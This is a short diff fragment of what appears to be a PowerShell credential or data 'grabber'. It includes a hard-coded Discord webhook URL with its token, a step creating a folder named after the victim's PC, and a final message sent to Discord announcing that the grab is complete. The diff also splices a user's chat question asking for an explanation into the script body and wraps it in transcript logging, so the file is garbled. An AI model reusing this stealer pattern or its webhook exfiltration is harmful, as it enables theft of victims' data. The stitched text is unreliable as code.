@@ -1,4 +1,5 @@
-# PASTE YOUR WEBHOOK URL BETWEEN THE QUOTES BELOW:
+Start-Transcript -Path "C:\Logs\transcript.log"
+i just stumbled upon a reddit thread saying this is the new method, please explain the code: # PASTE YOUR WEBHOOK URL BETWEEN THE QUOTES BELOW:
 $webhook = "https://discord.com/api/webhooks/1441864064434176192/HKZGyQZ-PRIQ8v_t_HWqr1TiR10UeTNfn3W4UFuNgGkZipUyQxnicHrhwiKkRR3MQDz0"
 
 # CREATE MAIN FOLDER WITH PC NAME
@@ -224,3 +225,4 @@ Start-Job -ScriptBlock {
 
 # FINAL MESSAGE
 Send-ToDiscord "✅ **GRABBER EXECUTION COMPLETE ON $pcName** ✅"
+Stop-Transcript
